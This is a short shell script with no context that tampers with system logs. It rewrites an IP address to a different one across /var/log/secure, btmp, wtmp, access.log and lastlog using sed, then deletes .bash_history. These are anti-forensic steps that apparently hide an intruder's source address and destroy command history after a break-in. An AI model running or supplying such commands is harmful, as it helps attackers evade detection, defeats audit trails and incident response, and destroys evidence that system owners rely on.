 sed -i 's/202.117.179.20/172.29.1.1/g' /var/log/secure
 sed -i 's/202.117.179.20/172.29.1.1/g' /var/log/btmp
 sed -i 's/202.117.179.20/172.29.1.1/g' /var/log/wtmp
 sed -i 's/202.117.179.20/172.29.1.1/g' /var/log/access.log
 sed -i 's/202.117.179.20/172.29.1.1/g' /var/log/lastlog
 rm -f .bash_history
